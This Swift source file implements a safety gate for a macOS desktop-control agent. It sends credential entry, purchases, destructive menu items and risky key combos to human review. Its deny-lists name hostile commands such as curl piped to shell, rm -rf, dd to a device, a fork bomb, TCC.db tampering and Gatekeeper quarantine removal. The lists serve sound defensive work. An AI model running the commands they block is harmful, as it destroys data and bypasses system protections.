import Foundation

public enum GateVerdict: Sendable, Equatable {
    case allow
    case deny(reason: String)
    /// Irreversible or denylisted: the loop must stop and ask a human.
    case needsHuman(reason: String)

    var label: String {
        switch self {
        case .allow: return "allow"
        case .deny(let r): return "deny(\(r))"
        case .needsHuman(let r): return "needsHuman(\(r))"
        }
    }
}

/// Classifies every action before it executes. Deny-list is hard: no policy
/// flag can override it — the step is escalated to a human instead.
public struct SafetyGate: Sendable {
    public var allowReversible: Bool
    public var allowIrreversible: Bool

    /// Patterns that always route to a human, even in `--allow-irreversible`
    /// runs: credentials, purchases, outbound messages.
    public static let denyPatterns: [(regex: String, why: String)] = [
        // `password` gets \w*-flanked matching so "Passwords", "1Password"
        // and "myPassword" all hit — the rest keep strict word boundaries
        // ("pin" must not trip on "spinner").
        (#"(?i)\b(\w*password\w*|passwd|passcode|pin|otp|2fa|totp|cvc|cvv|security code|card number|keychain|kartu|sandi)\b"#,
         "credential-like content"),
        (#"(?i)\b(buy now|purchase|checkout|place order|konfirmasi pembayaran|bayar sekarang)\b"#,
         "possible purchase"),
        // Executable URL schemes typed into an address bar run script.
        // `javascript:`/`vbscript:` always execute; `data:` only when it
        // carries a document (plain "data: 5 rows" stays free).
        (#"(?i)\b(javascript|vbscript)\s*:"#, "executable URL scheme"),
        (#"(?i)\bdata\s*:\s*(text/html|image/svg)"#, "executable URL scheme"),
        // Destructive shell variants — any rm flag bundle containing r or f
        // (-rf, -fr, -r -f, -vrf) routes to a human; plain rm -i stays free.
        (#"(?i)\brm\s+(-\w*\s+)*-\w*[rf]"#, "destructive shell"),
        (#"(?i)\b(mkfs|diskutil\s+erase)"#, "destructive shell"),
        // dd is dangerous only when it writes to a device — any flag order
        // (dd bs=4M if=x of=/dev/rdisk2). Writing an image to a file is a
        // normal irreversible step, not denylisted.
        (#"(?i)\bdd\b[^|;&]*\bof=\s*/dev/"#, "destructive shell"),
        // Disk/boot/service-bypass tools that can brick or persistently
        // alter the machine — humans only.
        (#"(?i)\b(csrutil|bless|fdisk|newfs_\w+|gpt\s+destroy)\b"#, "destructive shell"),
        (#"(?i)\blaunchctl\s+(bootout|disable|unload)\b"#, "destructive shell"),
        // The fork bomb is punctuation-only — a \b anchor can never match it.
        (#":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"#, "destructive shell"),
        // Process kill — "kill Finder" mid-task destroys the user's session.
        // kill <pid> (any signal or none — default SIGTERM kills too) as well
        // as pkill/killall/xkill; the word "kill" alone stays free.
        (#"(?i)\b(pkill|killall|xkill|kill\s+-\w+|kill\s+(-\w+\s+)*\d+)\b"#, "process kill"),
        // Power/session control — an agent must not log out or power off.
        (#"(?i)\b(shutdown|reboot|halt|poweroff)\b"#, "power/session control"),
        (#"(?i)\bpmset\s+(sleep|restart|shutdown)"#, "power/session control"),
        (#"(?i)osascript.*(shut\s*down|restart|log\s*out|sleep)"#, "power/session control"),
        // AppleScript's shell escape — typed into Script Editor/Automator
        // (not "terminals", so the terminal list never sees it) it runs
        // arbitrary shell as that app.
        (#"(?i)\bdo\s+shell\s+script\b"#, "AppleScript shell escape"),
        // Remote code execution — `curl evil.sh | sh` is the classic
        // supply-chain footgun; a fetched script is never safe to run blind.
        (#"(?i)\b(curl|wget)\b[^|;&]*\|\s*(sudo\s+)?(ba|z)?sh\b"#, "remote script piped to shell"),
        (#"(?i)\b(curl|wget)\b[^|;&]*\|\s*(sudo\s+)?(python\d*|perl|ruby|osascript)\b"#, "remote script piped to interpreter"),
    ]

    /// Process names whose text area IS a shell — keystrokes there become
    /// commands on Return, so text headed for them gets command scrutiny.
    /// (By localized process name — what `frontmostApp` reports.)
    public static let terminalApps: Set<String> = [
        "Terminal", "iTerm2", "iTerm", "kitty", "alacritty", "WezTerm",
        "wezterm-gui", "ghostty", "Warp", "Hyper", "tmux", "screen", "zsh", "bash",
    ]

    /// Commands that are dangerous the moment they exist in a shell — the
    /// generic deny-list catches flag-bearing variants; this list catches
    /// what typed text can smuggle in (`rm file`, `sudo …`, `ssh host`)
    /// without needing any flag. Applied only when the frontmost app is a
    /// terminal — the same words in a TextEdit note stay free.
    public static let terminalDenyPatterns: [(regex: String, why: String)] = [
        (#"(?i)\brm\b"#, "file deletion via terminal"),
        (#"(?i)\b(sudo|su)\b"#, "privilege escalation via terminal"),
        (#"(?i)\bssh\b"#, "remote session via terminal"),
        (#"(?i)>\s*/dev/"#, "device write via terminal"),
        (#"(?i)\b(dd|mkfs\w*|newfs_\w*|fdisk|diskutil)\b"#, "disk operation via terminal"),
        (#"(?i)\b(defaults\s+(write|delete)|launchctl|csrutil|nvram|systemsetup|scutil)\b"#,
         "system configuration via terminal"),
        (#"(?i)\b(kill|pkill|killall|xkill)\b"#, "process kill via terminal"),
        (#"(?i)\b(shutdown|reboot|halt|poweroff|pmset|logout)\b"#, "power/session via terminal"),
        (#"(?i)\bgit\s+push\b[^|;&]*(-f\b|--force)"#, "force push via terminal"),
        (#"(?i)\b(curl|wget|nc|ncat)\b[^|;&]*\|"#, "remote content piped via terminal"),
        (#"(?i)\b(brew|npm|pip\d*|gem|cargo)\s+uninstall\b"#, "package removal via terminal"),
        (#"(?i)\b(chmod|chown|chflags)\s+-R\b"#, "recursive permission change"),
        // osascript can drive ANY app + inject keystrokes — it is a
        // full GUI-control side channel around this gate.
        (#"(?i)\bosascript\b"#, "automation scripting via terminal"),
        // TCC.db tampering / tccutil = silently granting oneself
        // Accessibility/Screen Recording — the permission system itself.
        (#"(?i)\btccutil\b|\bTCC\.db\b"#, "permission database tamper"),
        // Gatekeeper bypass on downloaded payloads.
        (#"(?i)\bxattr\b[^|;&]*-d\s+[^|;&]*com\.apple\.(quarantine|FinderInfo)"#,
         "Gatekeeper flag removal via terminal"),
    ]

    /// Extra pass for text destined for a terminal: the payload is a shell
    /// command, so it gets command-level scrutiny on top of `evaluate`.
    /// Static — the actuator re-checks at act time too, since the frontmost
    /// app can flip to a terminal between observe and the keystroke landing.
    public static func evaluateTerminalPayload(_ text: String) -> GateVerdict {
        for rule in Self.terminalDenyPatterns {
            if text.range(of: rule.regex, options: .regularExpression) != nil {
                return .needsHuman(reason: "terminal: \(rule.why)")
            }
        }
        return .allow
    }

    public init(allowReversible: Bool = true, allowIrreversible: Bool = false) {
        self.allowReversible = allowReversible
        self.allowIrreversible = allowIrreversible
    }

    static let destructiveMenu =
        #"\b(delete|erase|empty trash|move to (the )?trash|remove|discard|revert|clear (all|history)|log ?out|sign ?out|restart|shut ?down|reset|uninstall|format|burn)\b"#

    public func evaluate(_ action: Action) -> GateVerdict {
        // Deny-list first: it applies to every class.
        if case .keyCombo(let keys) = action {
            // Destructive shortcuts a model can emit with two tokens: ⌘Q
            // quits the frontmost app (unsaved work dies with it) and
            // ⌘⌥⎋ opens force-quit. The user can't have meant these unless
            // they said them — a scripted goal still says them verbatim.
            let ks = Set(keys.map { $0.lowercased() })
            let cmd = !ks.isDisjoint(with: ["cmd", "command"])
            let opt = !ks.isDisjoint(with: ["opt", "option", "alt"])
            let ctrl = !ks.isDisjoint(with: ["ctrl", "control"])
            if cmd && ks.contains("q") {
                // ⇧⌘Q logs the user OUT entirely — quitting the frontmost
                // app is reversible-ish, ending the session is not.
                if !ks.isDisjoint(with: ["shift"]) {
                    return .needsHuman(reason: "⇧⌘Q logs out — it would end the whole session")
                }
                return .needsHuman(reason: "⌘Q quits the app — possible unsaved-work loss")
            }
            // Key aliases matter: "escape" posts the same keyCode as "esc".
            if cmd && opt && !ks.isDisjoint(with: ["esc", "escape"]) {
                return .needsHuman(reason: "⌘⌥⎋ opens Force Quit")
            }
            // ⌃⌘Q locks the screen instantly — a run that locks the
            // screen can't observe or act afterwards: self-stalling.
            if cmd && ctrl && ks.contains("q") {
                return .needsHuman(reason: "⌃⌘Q locks the screen — a locked screen stalls the agent")
            }
            // ⌃⌥Space is s1's own wake chord — a model posting it toggles
            // the agent's listener mid-run: self-disruption, not the goal.
            if ctrl && opt && !ks.isDisjoint(with: ["space", "spacebar"]) {
                return .needsHuman(
                    reason: "⌃⌥Space is s1's own wake hotkey — it would toggle the agent's listener")
            }
            if ctrl && opt && ks.contains("d") {
                return .needsHuman(reason: "⌃⌥D is s1's dictation hotkey — it would open the mic mid-run")
            }
            if opt && !ctrl && !cmd && !ks.isDisjoint(with: ["space", "spacebar"]) {
                return .needsHuman(reason: "⌥Space is s1's launcher hotkey — it would steal focus mid-run")
            }
        }
        // Menu commands that destroy or end something wait for the user,
        // whoever asked: deleting, erasing, logging out, shutting down.
        if case .menuItem(let path) = action, let title = path.last,
           title.range(of: Self.destructiveMenu, options: [.regularExpression, .caseInsensitive]) != nil {
            return .needsHuman(reason: "“\(path.joined(separator: " › "))” can't be undone")
        }
        for payload in action.textPayloads {
            for rule in Self.denyPatterns {
                if payload.range(of: rule.regex, options: .regularExpression) != nil {
                    return .needsHuman(reason: "denylist: \(rule.why)")
                }
            }
        }
        switch action.actionClass {
        case .read:
            return .allow
        case .reversible:
            return allowReversible ? .allow : .deny(reason: "reversible actions disabled")
        case .irreversible:
            return allowIrreversible
                ? .needsHuman(reason: "irreversible requires human confirmation")
                : .deny(reason: "irreversible not allowed (pass --allow-irreversible to queue for confirmation)")
        }
    }
}
